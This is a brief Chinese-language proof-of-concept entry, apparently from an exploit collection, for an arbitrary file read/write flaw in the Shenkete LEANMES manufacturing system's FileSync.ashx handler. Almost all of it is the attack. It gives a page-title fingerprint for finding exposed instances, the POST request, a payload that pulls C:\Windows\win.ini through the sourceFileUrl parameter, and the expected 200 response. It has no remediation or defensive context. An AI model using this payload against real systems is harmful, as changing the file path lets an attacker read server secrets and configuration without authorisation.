# 深科特LEANMES系统FileSync.ashx存在任意文件读取漏洞

深科特LEANMES系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`POST /Handler/FileSync.ashx HTTP/1.1`

**Payload**
```
type=DownLoad&sourceFileUrl=C:\\Windows\\win.ini
```
- **响应特征**：200